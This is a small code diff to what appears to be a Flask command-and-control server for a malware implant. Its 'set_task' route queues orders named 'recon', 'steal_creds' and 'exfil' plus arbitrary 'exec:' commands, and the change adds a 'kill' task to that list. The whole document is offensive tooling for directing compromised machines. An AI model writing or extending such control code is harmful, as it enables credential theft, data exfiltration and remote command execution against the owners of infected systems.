@@ -68,7 +68,7 @@ def upload():
 @app.route('/set_task/<task>', methods=['GET'])
 def set_task(task):
     global current_task
-    valid_tasks = ["sleep", "recon", "steal_creds", "exfil"]
+    valid_tasks = ["sleep", "recon", "steal_creds", "exfil", "kill"]
     if task in valid_tasks or task.startswith("exec:"):
         current_task = task
         print(f"[+] Task set to: {task}")
